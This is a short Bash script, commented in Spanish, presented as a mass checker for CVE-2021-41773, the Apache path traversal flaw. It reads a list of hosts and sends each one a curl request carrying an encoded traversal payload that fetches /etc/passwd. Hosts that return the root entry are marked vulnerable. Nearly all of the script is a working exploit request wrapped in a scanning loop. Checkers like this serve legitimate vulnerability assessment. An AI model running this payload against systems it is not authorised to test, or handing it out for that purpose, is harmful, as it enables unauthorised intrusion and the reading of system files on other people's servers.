#!/bin/bash
#-*- ENCODING: UTF-8 -*-
# Simple CVE-2021-41773 checker


archivo=$1
barra=`echo "-------------------------------------------------"`
file="etc/passwd"
dt=`date +"%Y_%m_%d_%H%M%S"`

#-------Colores-------
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
grayColour="\e[0;37m\033[1m"
greenColour="\e[0;32m\033[1m"

function helpPanel (){
	echo -e "\n\t[+] Uso: ./CVE-2021-41773.sh hosts.txt"
	exit 1
}

if [ -f $dt"/temp.tmp" ];then
   rm -f $dt"/temp.tmp"
fi

function checker (){
	carpeta=`mkdir $dt`
	for ip in $(cat $archivo | sort -u );do
		request=`curl --max-time 2 -i -s -k -L -X GET $ip"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/"$file > $dt"/temp.tmp"`
#		request=`curl --max-time 2 -i -s -k -L -X GET "https://"$ip":8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/"$file > $dt"/temp.tmp"` #Para consultar por puerto en específico, comentar la línea anterior y descomentar esta, indicando el puerto en la consulta#
		gr=`grep "root:x:0:0:root" $dt"/temp.tmp"`
		if [ $? -eq 0 ]; then
			echo $barra
			echo -e "[x] Host: $ip Vulnerable" >> $dt"/report.txt"
			echo -e "${redColour}"$(tail -n1 $dt"/report.txt")"${endColour}"
		else
			echo $barra
			echo -e "[✔] Host: $ip No vulnerable" >> $dt"/report.txt"
			echo -e "${greenColour}"$(tail -n1 $dt"/report.txt")"${endColour}"
		fi
	done

	echo $barra; sleep 1
	echo -e "  ${greenColour}[✔]${endColour}${grayColour} Total equipos OK:    ${endColour}${greenColour}"$(cat $dt"/report.txt" | grep "\[✔\]" | wc -l)"${endColour}"
	echo $barra; sleep 1
	echo -e "  ${redColour}[x]${endColour}${grayColour} Total equipos vulnerables:    ${endColour}${redColour}"$(cat $dt"/report.txt" | grep "\[x\]" | wc -l)"${endColour}"
	echo $barra; sleep 1
	rm -f $dt"/temp.tmp" >/dev/null 2>&1
	exit 0
}

if [ $# -eq 0 ]; then
	helpPanel
else
	checker
fi
